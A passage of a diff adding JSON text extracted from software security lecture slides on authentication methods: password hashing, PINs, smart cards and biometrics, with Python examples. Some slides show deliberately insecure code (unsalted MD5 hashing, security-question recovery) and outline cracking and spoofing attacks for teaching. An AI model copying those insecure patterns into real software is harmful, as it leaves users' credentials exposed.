+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 13\nDefensive in Depth\n"
+      },
+      {
+        "page": 8,
+        "text": "Resiliency\nDr. Ayman Taha - Dr. Donia Gamal 14\nFail Secure"
+      },
+      {
+        "page": 9,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 15\nDiversity "
+      },
+      {
+        "page": 10,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 16\n"
+      },
+      {
+        "page": 11,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 17\nOpen Design Principles"
+      },
+      {
+        "page": 12,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 18\n"
+      },
+      {
+        "page": 13,
+        "text": "Thanks!\nDo you have any questions?\nDr. Ayman Taha - Dr. Donia Gamal 19\n"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lecture 4.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "CET431- Software Security\n1\nLecture 4\nDr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 2,
+        "text": "Authentication Methods\nWhy \u00b7 How \u00b7 Strengths \u00b7 Weaknesses \u00b7 When . Real-world cases\n2\nDr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 3,
+        "text": "INTRODUCTION\nWhat is Authentication? Security First Gateway\n\u2022  Authentication (AuthN): verifying that an entity (user, device, or service) is who or what it \nclaims to be.\n\u2022  Authorization (AuthZ): deciding what an already-authenticated entity may do - always \ncomes after AuthN.\n\u2022  Non-repudiation: authenticated actions are logged so the actor cannot later deny them.\n\u2022  A breach of the authentication layer defeats every control above it (RBAC, ABAC, \nencryption-at-rest...).\nAuthN = identity proof  \u2192  AuthZ = permission decision  \u2192  Audit = accountability.\n3Dr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 4,
+        "text": "INTRODUCTION \u00b7 STANDARDS\nNIST SP 800-63-4 (2025): Assurance Levels\nLevel Requirement Example authenticators\nAAL1 Basic - single-factor allowed Password only\nAAL2 Two factors, phishing-resistant preferred Synced passkey; password + TOTP \n(minimum)\nAAL3 Hardware-bound, verifier impersonation \nresistant\nDevice-bound, PIV/CAC smart card\nDr. Ayman Taha - Dr. Donia Gamal 4\nThe AALs indicate how strongly an authentication method verifies the user\u2019s identity."
+      },
+      {
+        "page": 5,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 5\n"
+      },
+      {
+        "page": 6,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke, gait)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n4"
+      },
+      {
+        "page": 7,
+        "text": ""
+      },
+      {
+        "page": 8,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke, gait)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n4"
+      },
+      {
+        "page": 9,
+        "text": "CATEGORY 1 \u2013 SOMETHING YOU KNOW\nKnowledge-Based Authentication: Passwords\n\u25a0  How It Works\n\u2022 User registers a secret string; server stores a salted, slow one-way hash (never the plaintext).\n\u2022 On login, the server hashes the submitted password with the stored salt and compares digests\n\u2022  Modern recommended hashing: Argon2id or bcrypt/scrypt \u2013 never fast hashes like MD5/SHA-1\n\u25a0  Implementation Considerations\n\u2022 Enforce breach-password screening (check against known-compromised lists, e.g., HaveIBeenPwned API)\n\u2022 Use Argon2id/bcrypt with per-user salt + server-side pepper; rate-limit and lock out after failed attempts\n\u2022 DISCOURAGES forced periodic rotation and arbitrary complexity rules\n5\nSalt = different label for each password\nPepper = secret ingredient known only to the server"
+      },
+      {
+        "page": 10,
+        "text": "CATEGORY 1 - SOMETHING YOU KNOW\nKnowledge-Based: Passwords\nWHY does it exist?\nCheapest possible factor: no hardware, no enrollment logistics - every user already understands it.\nHOW does it work?\n\u2022 Registration: server stores a salted, slow one-way hash (argon2id) - never the plaintext.\n\u2022 Login: server hashes the candidate and compares digests in constant time.\n+  STRENGTHS\n\u2022 Zero cost, works on every device.\n\u2022 Only factor that works fully offline in the user's head - no device needed.\n\u2212  WEAKNESSES\n\u2022 Reuse + phishing + brute force: RockYou2024 leak exposed ~10 billion plaintext passwords.\n\u2022 Fast hashes (MD5/SHA-1) fall to GPUs at billions of guesses/second.\n\u2022 Users pick weak secrets; helpdesk resets are a social-engineering target.\nWHEN should you use it?\nAlways present as a fallback - but never alone for anything valuable; pair with MFA or migrate to passkeys.\nDr. Ayman Taha - Dr. Donia Gamal 10"
+      },
+      {
+        "page": 11,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 11\nimport bcrypt\ndef register(password: str) -> bytes:\n    salt = bcrypt.gensalt(rounds=12)\n    return bcrypt.hashpw(password.encode(), salt)\n \ndef verify(password: str, stored_hash: bytes) -> \nbool:\n    return bcrypt.checkpw(\n        password.encode(), stored_hash\n    )\n# Never log, print, or transmit the raw password.\n# Always compare using constant-time checkpw(),\n# never a manual '==' string comparison."
+      },
+      {
+        "page": 12,
+        "text": "CATEGORY 1 - CODE & REAL LIFE\nPasswords: Argon2id Hashing (Python)\npip install argon2-cffi\nfrom argon2 import PasswordHasher\nfrom argon2.exceptions import VerifyMismatchError\nph = PasswordHasher()                 # argon2id, OWASP parameters\n \n# REGISTRATION - store ONLY this string in the database\nstored = ph.hash(\"StudentPassw0rd!\") #input from user\n# $argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>\n \n# LOGIN - verify the candidate password\ntry:\nph.verify(stored, \"StudentPassw0rd!\");  print(\"LOGIN OK\")\nexcept VerifyMismatchError:\n    print(\"LOGIN FAILED\")\nREAL LIFE Cases\n\u2022  RockYou2024: ~10B passwords leaked - NIST requires screening new passwords against breach lists.\n\u2022  MGM Resorts (2023): attackers bypassed passwords with a 10-minute help-desk phone call.\nDr. Ayman Taha - Dr. Donia Gamal 12"
+      },
+      {
+        "page": 13,
+        "text": "CATEGORY 1 - SOMETHING YOU KNOW\nPasswords: Code Explained\n\u2022 PasswordHasher() function selects argon2id with safe defaults: Version of Algorithm, Memory cost, \nParallelism, Number of iterations\u2026etc.\n\u2022 hash() creates a random salt per call, so two users with the same password get different hashes.\n\u2022 The stored string is self-describing: algorithm, version, cost parameters, salt and digest.\n\u2022 verify() re-hashes the candidate with the stored salt/parameters and compares in constant time.\n\u2022 A mismatch raises VerifyMismatchError - never compare hashes yourself with ==.\nEXPECTED OUTPUT\n$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$Zk3...\nLOGIN OK          # correct password\nLOGIN FAILED      # any other password\nCOMMON PITFALL\nUsing MD5/SHA-1 \u201cwith a salt\u201d: GPUs test \nbillions of guesses per second. \nDr. Ayman Taha - Dr. Donia Gamal 13"
+      },
+      {
+        "page": 14,
+        "text": "CATEGORY 1 - SOMETHING YOU KNOW\nPasswords: Insecure vs Secure\n\u2717  INSECURE \u2713  SECURE\nimport hashlib\nh = hashlib.md5(pw.encode()).hexdigest()\ndb.save(user, h)\n# fast + unsalted: same password,\n# same hash -> rainbow tables\nfrom argon2 import PasswordHasher\nph = PasswordHasher()\n# salted, slow, memory-hard\ndb.save(user, ph.hash(pw))\nif ph.check_needs_rehash(h): rehash()\nMORE REAL-LIFE CASES\n\u2022  LinkedIn (2012): unsalted SHA-1 hashes leaked and were cracked in bulk \n\u2022  Adobe (2013): passwords were reversibly encrypted (3DES) with hints; identical ciphertexts exposed millions of users.\n\u2022  Credential stuffing (2024): attackers replayed leaked password pairs on other sites; unique passwords + MFA stop it.\nDr. Ayman Taha - Dr. Donia Gamal 14"
+      },
+      {
+        "page": 15,
+        "text": "CATEGORY 1 - SOMETHING YOU KNOW\nPasswords: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\n\u2022 Obtain the password-hash database (SQL \ninjection, stolen backup, insider access, or a \nmisconfigured S3 bucket).\n\u2022 Pick an attack mode: dictionary or a mask for a \nknown pattern (e.g. Name2026!).\n\u2022 Fast/unsalted hashes fall in minutes to hours; \nidentical passwords reveal themselves instantly \nvia identical hash values.\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 Hash with argon2id (or bcrypt/scrypt): memory-\nhard, GPU-resistant, tunable cost (m=65536, t=3, \np=4).\n\u2022 Give every user a unique random salt, so identical \npasswords never produce identical hashes \n(defeats rainbow tables).\n\u2022 Screen new passwords against breach corpora \n(HaveIBeenPwned k-anonymity API) before \naccepting them.\n\u2022 Rate-limit login attempts and alert on bulk \nread/export queries against the credentials table.\n15Dr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 16,
+        "text": "CATEGORY 1 - SOMETHING YOU KNOW\nPINs & Security Questions\nWHY does it exist?\n\u2022 A short secret optimized for speed on a single device - typing a 20-char password 50\u00d7/day is unusable.\nHOW does it work?\n\u2022 PIN never leaves the device: it unlocks a private key inside the TPM / secure enclave.\n\u2022 Hardware lockout (anti-hammering): N wrong tries \u2192 exponential delay or wipe.\n+  STRENGTHS\n\u2022 Nothing secret transmitted to any server - server-side breach leaks no PINs.\n\u2022 Short secret is safe BECAUSE verification is local and rate-limited in hardware.\n\u2212  WEAKNESSES\nShoulder surfing, smudge attacks, weak choices (1234, birth year).\nTied to one device - lose the device, re-enroll everywhere.\nSecurity questions: public, low-entropy answers - NIST 800-63-4 bans them for recovery.\nWHEN should you use it?\nLocal device unlock and passkey user-verification (Windows Hello PIN, phone lock screen).\nDr. Ayman Taha - Dr. Donia Gamal 16\n"
+      },
+      {
+        "page": 17,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 17\n"
+      },
+      {
+        "page": 18,
+        "text": "CATEGORY 1 - SOMETHING YOU KNOW\nPINs & Questions: Code Explained\n1   PinLock models a TPM / secure enclave: the PIN and the failure counter live inside tamper-resistant \nhardware.\n2   try_pin() first checks locked_until - during a lockout even the CORRECT PIN is refused.\n3   Correct PIN: the counter resets and the hardware releases the private key (never the PIN itself).\n4   Wrong PIN: fails += 1; from the 5th failure the lockout is 2**fails seconds (exponential back -off).\n5   Result: a 4-digit PIN (10,000 combinations) cannot realistically be brute-forced online.\nEXPECTED OUTPUT\n1234 -> WRONG (1/5)\n...\n2222 -> WRONG (5/5)     # 5th failure: locked 32 s\n8620 -> LOCKED - wait   # correct PIN refused\nCOMMON PITFALL\nEnforcing the limit in app or server code: an \nattacker who copies the data brute-forces \noffline. \n3318Dr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 19,
+        "text": "CATEGORY 1 - SOMETHING YOU KNOW\nPINs & Questions: Insecure vs Secure\n\u2717  INSECURE \u2713  SECURE\n# security-question recovery\nif answer.lower() == user.pet_name:\n    reset_password()\n# answers are public or guessable\n# (pet, school, maiden name)\n# recovery via verified channel\nsend_magic_link(user.email,\n    ttl=900, single_use=True)\nrequire_passkey_or_mfa()\n# no guessable answers\nMORE REAL-LIFE CASES\n\u2022  Windows Hello for Business: the PIN is bound to the TPM of ONE device - useless if stolen elsewhere.\n\u2022  iPhone: escalating delays and optional erase after 10 wrong passcodes - hardware-enforced anti-hammering.\n3419Dr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 20,
+        "text": "CATEGORY 1 - SOMETHING YOU KNOW\nPINs & Questions: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\n\u2022 Brute force directly against a server/API that \nhas no lockout: loop PIN 0000\u20139999 (10,000 \nrequests, trivial speed).\n\u2022 Shoulder-surf or record a phone/ATM camera \nwhile the victim enters the PIN in public.\n\u2022 Smudge attack: analyze oily fingerprint \nsmudges left on a touchscreen to narrow the \ncandidate digits.\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 Enforce the failure counter and lockout IN \nHARDWARE never only in application \ncode.\n\u2022 Use exponential backoff and a permanent \nwipe after N failures (e.g., iOS wipes after \n10 wrong passcodes).\n\u2022 Require a second factor (biometric or \ndevice possession) for any REMOTE PIN \nuse - never accept a bare PIN over a \nnetwork.\n\u2022 Harden the UI against observation: \nrandomized keypad layout, privacy screen \nfilters on public terminals.\n35Dr. Ayman Taha - Dr. Donia Gamal 20"
+      },
+      {
+        "page": 21,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke, gait)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n4"
+      },
+      {
+        "page": 22,
+        "text": "CATEGORY 2 - SOMETHING YOU HAVE\nPossession-Based: OTP Tokens & Smart Cards\nWHY does it exist?\nProve physical possession of a registered object - remote attackers can't clone tamper-resistant hardware.\nHOW does it work?\n\u2022 OTP token (RSA SecurID): shared seed + clock \u2192 new 6-digit code every 60 s, checked by the server.\n\u2022 Smart card (PIV/CAC, EMV): server challenge is signed ON-CARD; the private key can never be exported.\n+  STRENGTHS\n\u2022 Smart cards reach AAL3: phishing-resistant, verifier-impersonation resistant.\n\u2022 OTP tokens work offline, no phone required, decades of field hardening.\n\u2212  WEAKNESSES\n\u2022 Cost, logistics, loss/damage; readers required for cardsor OTP Device.\nWHEN should you use it?\nHigh assurance: government (PIV/CAC mandate), defense, banking VPN, payment cards (EMV).`\nDr. Ayman Taha - Dr. Donia Gamal 22"
+      },
+      {
+        "page": 23,
+        "text": "CATEGORY 2 - CODE & REAL LIFE\nSmart Card: Challenge\u2013Response Flow\nDr. Ayman Taha - Dr. Donia Gamal 23\nIn Step 1, the Server or Relying Party generates a \nunique random challenge, denoted as C, and sends it \nto the smart card. The challenge is different for every \nauthentication attempt, which helps prevent replay \nattacks.\nIn Step 2, after the user unlocks the smart card by \nentering a valid PIN, the card uses its non-exportable \nprivate key stored securely within the hardware. The \nprivate key never leaves the card. The smart card then \ncomputes an RSA digital signature over the received \nchallenge."
+      },
+      {
+        "page": 24,
+        "text": "CATEGORY 2 - CODE & REAL LIFE\nSmart Card: Challenge\u2013Response Flow\nDr. Ayman Taha - Dr. Donia Gamal 24\nIn Step 3, the smart card sends two items back to the \nserver:\n1. The generated signature, represented as sig.\n2. The card's public key certificate, which contains the \ncorresponding public key and identity information.\nFinally, in Step 4, the server validates the certificate then \nuses the public key from the certificate to verify the \nsignature against the original challenge C. "
+      },
+      {
+        "page": 25,
+        "text": "CATEGORY 2 - WALKTHROUGH\nSmart Cards: Code Explained\n1   The server sends a fresh random challenge C - the nonce makes every signature unique (anti-replay).\n2   The user types the PIN into the card reader; the chip verifies it locally and unlocks the key.\n3   The chip signs C with a private key generated on-card; the key is non-exportable.\n4   The card returns the signature plus its X.509 certificate (public key signed by the issuing CA).\n5   The server validates the certificate chain, then verifies the signature over C. \nEXPECTED OUTPUT\nchallenge = 9f3c...a1        (32 random bytes)\nsignature = 3045022100...     (from the chip)\ncert chain valid, OCSP: good\nverify() returns None  =>  LOGIN OK\nCOMMON PITFALL\n\u2022 Skipping revocation checks or trusting \nany CA: a lost card stays valid. \n\u2022 Never reuse a challenge, or a recorded \nsignature can be replayed.\nDr. Ayman Taha - Dr. Donia Gamal 25"
+      },
+      {
+        "page": 26,
+        "text": "CATEGORY 2 - WALKTHROUGH\nSmart Cards: Insecure vs Secure\n\u2717  INSECURE \u2713  SECURE\n# static card ID as the credential\nif req.headers[\"X-Card-ID\"] == u.card_id:\n    login()\n# copy the ID = clone the card\nc = os.urandom(32); save(sess, c)\nsig = card.sign(c)      # on-chip\npub.verify(sig, c, pad, hashes.SHA256())\ndelete(sess, c)    # single use\nDr. Ayman Taha - Dr. Donia Gamal 26"
+      },
+      {
+        "page": 27,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n4"
+      },
+      {
+        "page": 28,
+        "text": "CATEGORY 3 - SOMETHING YOU ARE\nInherence-Based: Physiological Biometrics\nWHY does it exist?\nNothing to remember, nothing to carry - the strongest usability of any factor.\nHOW does it work?\n\u2022 Sensor captures a trait (fingerprint ridges, face depth map, iris) \u2192 mathematical template.\n\u2022 Matching is a similarity SCORE vs a threshold - probabilistic, not exact like a password.\n\u2022 Modern model (FIDO/passkeys): template stays in the device secure enclave; it only unlocks a local key.\n+  STRENGTHS\n\u2022 Frictionless user verification; local-only biometric is phishing-resistant (never transmitted).\n\u2022 Face ID-class sensors: claimed false-accept rate ~1 in 1,000,000 with liveness/depth.\n\u2212  WEAKNESSES\n\u2022 IRREVOCABLE - you can't change your fingerprint after a template breach.\n\u2022 Presentation attacks: lifted prints, photos, masks - needs liveness detection.\n\u2022 FAR/FRR trade-off: stricter threshold locks out real users; looser admits impostors.\nWHEN should you use it?\nDevice-local user verification (unlocking passkeys, payment approval) - not as a remote sole factor.\nDr. Ayman Taha - Dr. Donia Gamal\n"
+      },
+      {
+        "page": 29,
+        "text": "CATEGORY 3 - CODE & REAL LIFE\nBiometrics: FAR / FRR Trade-off (Python)\n# Genuine users score HIGH, impostors score LOW (0..1 match scores)\ngenuine  = [0.92, 0.88, 0.71, 0.95, 0.83, 0.66, 0.90, 0.78]\nimpostor = [0.21, 0.35, 0.48, 0.12, 0.55, 0.30, 0.62, 0.18]\n \ndef rates(threshold):\n    FAR = sum(s >= threshold for s in impostor) / len(impostor)  # impostors ACCEPTED\n    FRR = sum(s <  threshold for s in genuine)  / len(genuine)   # real users REJECTED\n    return FAR, FRR\n \nfor t in (0.50, 0.60, 0.70, 0.80):\n    far, frr = rates(t)\n    print(f\"threshold={t:.2f}  FAR={far:.1%}  FRR={frr:.1%}\")\n# Lower threshold -> convenient but dangerous; higher -> secure but annoying.\n# The FAR==FRR point is the Equal Error Rate (EER) - how vendors compare sensors.\nREAL LIFE\n\u2022  OPM breach (2015): 5.6M federal employees' fingerprints stolen - permanent, unchangeable credentials.\n\u2022  Apple Face ID: depth-mapped face + liveness - a 2D photo fails; that is presentation-attack detection.\nDr. Ayman Taha - Dr. Donia Gamal 29\n"
+      },
+      {
+        "page": 30,
+        "text": "CATEGORY 3 - WALKTHROUGH\nBiometrics: Code Explained\n1   Scores are similarity values: genuine attempts cluster high, impostor attempts cluster low, but the two \noverlap.\n2   FAR = share of impostors scoring \u2265 threshold (security failure: the wrong person is accepted).\n3   FRR = share of genuine users scoring < threshold (usability failure: the owner is rejected).\n4   Raising the threshold lowers FAR but raises FRR; the loop prints this trade -off numerically.\n5   Vendors quote the Equal Error Rate (EER) where FAR = FRR - a lower EER means a better sensor.\nEXPECTED OUTPUT\nthreshold=0.50  FAR=25.0%  FRR=0.0%\nthreshold=0.60  FAR=12.5%  FRR=0.0%\nthreshold=0.70  FAR=0.0%   FRR=12.5%\nthreshold=0.80  FAR=0.0%   FRR=37.5%\nCOMMON PITFALL\nQuoting \u201c99% accurate\u201d: meaningless \nwithout FAR and FRR at a stated threshold, \ntested against spoof attempts (masks, lifted \nprints).\nDr. Ayman Taha - Dr. Donia Gamal 30"
+      },
+      {
+        "page": 31,
+        "text": "CATEGORY 3 - WALKTHROUGH\nBiometrics: Attack & Defense\n\u2717  ATTACK - HOW IT'S PERFORMED\n\u2022 Lift a latent fingerprint from a glass or phone \nscreen the victim touched (classic forensic \ntechnique).\n\u2022 For face sensors: use a high-resolution photo, \nvideo replay, or a 3D-printed mask if the sensor \nhas no depth or liveness check.\n\u2022 Present the fake artifact to the sensor instead \nof the live user - a 2D image-matching sensor \ncannot tell the difference.\n\u2713  DEFENSE - HOW TO PREVENT IT\n\u2022 Require liveness/depth detection: infrared \ndepth maps, pulse or blood-flow sensing, \nrandomized blink/smile challenges.\n\u2022 Use multi-modal verification (fingerprint + face, \nor biometric + device possession) so one \nspoofed modality isn't enough.\n\u2022 Keep templates and matching on-device in a \nsecure enclave - a breach of the backend \nreveals nothing usable remotely.\n\u2022 Log and rate-limit presentation attempts; flag \nrepeated failed scans followed by a sudden \nsuccess for review.\nDr. Ayman Taha - Dr. Donia Gamal 31"
+      },
+      {
+        "page": 32,
+        "text": "CATEGORY 3 - SOMETHING YOU ARE (CONTINUOUS)\nBehavioral Biometrics\nWHY does it exist?\nPasswords verify you once at login - behavioral signals verify you CONTINUOUSLY during the \nwhole session.\nHOW does it work?\n\u2022 Passively model interaction: keystroke dwell/flight time, mouse curves, touch pressure, gait.\n\u2022 Anomaly score feeds a risk engine \u2192 silent allow, step-up MFA, or session kill.\n+  STRENGTHS\n\u2022 Zero friction - invisible to the legitimate user.\n\u2022 Catches session hijacking and bots/RATs AFTER login, where classic auth is blind.\n\u2212  WEAKNESSES\n\u2022 Model drift: injury, stress, new keyboard \u2192 false alarms; needs ongoing retraining.\n\u2022 Privacy: continuous monitoring is surveillance-shaped; consent issues.\n\u2022 Not a standalone factor - a supporting risk signal only.\nWHEN should you use it?\nFraud scoring in banking/fintech, Zero Trust continuous evaluation, high-security portals.\nDr. Ayman Taha - Dr. Donia Gamal 32"
+      },
+      {
+        "page": 33,
+        "text": "Dr. Ayman Taha - Dr. Donia Gamal 33\n"
+      },
+      {
+        "page": 34,
+        "text": "CATEGORY 3 - CODE & REAL LIFE\nBehavioral: Keystroke Dynamics (Python)\nimport statistics\nprofile = {\"s\": 88, \"e\": 74, \"c\": 95, \"r\": 70, \"3\": 110, \"t\": 76}  # enrolled dwell (ms)\n \ndef anomaly_score(attempt):\n    d = [abs(attempt[k] - profile[k]) / profile[k] for k in profile if k in attempt]\n    return statistics.mean(d)                  # 0.0 = perfect match\n \nme    = {\"s\": 90, \"e\": 72, \"c\": 97, \"r\": 71, \"3\": 108, \"t\": 75}\nthief = {\"s\": 120, \"e\": 55, \"c\": 140, \"r\": 95, \"3\": 60, \"t\": 130}\nprint(\"legit   :\", round(anomaly_score(me), 3))      # ~0.02 -> allow\nprint(\"attacker:\", round(anomaly_score(thief), 3))   # ~0.45 -> step-up MFA!\n# rule: score < 0.15 allow | 0.15-0.35 step-up | > 0.35 lock + alert\nREAL LIFE\n\u2022  BioCatch-style banking systems detect remote-access trojans and money mules mid-session from typing/mouse \nanomalies.\nDr. Ayman Taha - Dr. Donia Gamal 34"
+      }
+    ]
+  },
+  {
+    "file": "C:\\Users\\jun69\\Desktop\\sec lec and labs\\Lecture 5.pdf",
+    "pages": [
+      {
+        "page": 1,
+        "text": "CET431- Software Security\n1\nLecture 5\nDr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 2,
+        "text": "Authentication Methods\nWhy \u00b7 How \u00b7 Strengths \u00b7 Weaknesses \u00b7 When . Real-world cases\n2\nDr. Ayman Taha - Dr. Donia Gamal"
+      },
+      {
+        "page": 3,
+        "text": "TAXONOMY\nClassification of Authentication Methods\n\u25a0  1. Knowledge-Based \u2013 \u201cSomething you know\u201d\n\u2013  Passwords, PINs, security questions\n\u25a0  2. Possession-Based \u2013 \u201cSomething you have\u201d\n\u2013  OTP hardware tokens, smart cards, hardware security keys (FIDO U2F)\n\u25a0  3. Inherence-Based \u2013 \u201cSomething you are / how you behave\u201d\n\u2013  Physiological biometrics (fingerprint, face, voice) and behavioral biometrics (keystroke)\n\u25a0  4. Location-Based \u2013 \u201cSomewhere you are\u201d\n\u2013  IP allow-listing, geofencing, network-location trust\n\u25a0  5. Time-Based \u2013 \u201cWhen you act\u201d\n\u2013  TOTP (RFC 6238), HOTP (RFC 4226) \u2013 time/counter-synchronized one-time codes\n\u25a0  6. Composite \u2013 Multi-Factor & Adaptive (Risk-Based) Authentication\n\u2013  Combines two or more factor categories above; adapts requirements to real-time risk\n\u25a0  7. Emerging \u2013 Passwordless, Decentralized, Quantum-Resistant\n\u2013  Passkeys/FIDO2/WebAuthn, Decentralized Identifiers, post-quantum authentication schemes\n"
+      },
+      {
+        "page": 4,
+        "text": "CATEGORY 3 - SOMETHING YOU ARE\nInherence-Based: Physiological Biometrics\nWHY does it exist?\nNothing to remember, nothing to carry - the strongest usability of any factor.\nHOW does it work?\n\u2022 Sensor captures a trait (fingerprint ridges, face depth map, iris) \u2192 mathematical template.\n\u2022 Matching is a similarity SCORE vs a threshold - probabilistic, not exact like a password.\n\u2022 Modern model (FIDO/passkeys): template stays in the device secure enclave; it only unlocks a local key.\n+  STRENGTHS\n\u2022 Frictionless user verification; local-only biometric is phishing-resistant (never transmitted).\n\u2022 Face ID-class sensors: claimed false-accept rate ~1 in 1,000,000 with liveness/depth.\n\u2212  WEAKNESSES\n\u2022 IRREVOCABLE - you can't change your fingerprint after a template breach.\n\u2022 Presentation attacks: lifted prints, photos, masks - needs liveness detection.\n\u2022 FAR/FRR trade-off: stricter threshold locks out real users; looser admits impostors.\nWHEN should you use it?\nDevice-local user verification (unlocking passkeys, payment approval) - not as a remote sole factor.\nDr. Ayman Taha - Dr. Donia Gamal\nFast \nIdentity \nOnline"
+      },
+      {
+        "page": 5,
+        "text": "CATEGORY 3 - CODE & REAL LIFE\nBiometrics: FAR / FRR Trade-off (Python)\n# Genuine users score HIGH, impostors score LOW (0..1 match scores)\ngenuine  = [0.92, 0.88, 0.71, 0.95, 0.83, 0.66, 0.90, 0.78]\nimpostor = [0.21, 0.35, 0.48, 0.12, 0.55, 0.30, 0.62, 0.18]\n \ndef rates(threshold):\n    FAR = sum(s >= threshold for s in impostor) / len(impostor)  # impostors ACCEPTED\n    FRR = sum(s <  threshold for s in genuine)  / len(genuine)   # real users REJECTED\n    return FAR, FRR\n \nfor t in (0.50, 0.60, 0.70, 0.80):\n    far, frr = rates(t)\n    print(f\"threshold={t:.2f}  FAR={far:.1%}  FRR={frr:.1%}\")\n# Lower threshold -> convenient but dangerous; higher -> secure but annoying.\n# The FAR==FRR point is the Equal Error Rate (EER) - how vendors compare sensors.\nREAL LIFE\n\u2022  OPM breach (2015): 5.6M federal employees' fingerprints stolen - permanent, unchangeable credentials.\n\u2022  Apple Face ID: depth-mapped face + liveness - a 2D photo fails; that is presentation-attack detection.\nDr. Ayman Taha - Dr. Donia Gamal 29\n"
+      },
+      {
+        "page": 6,
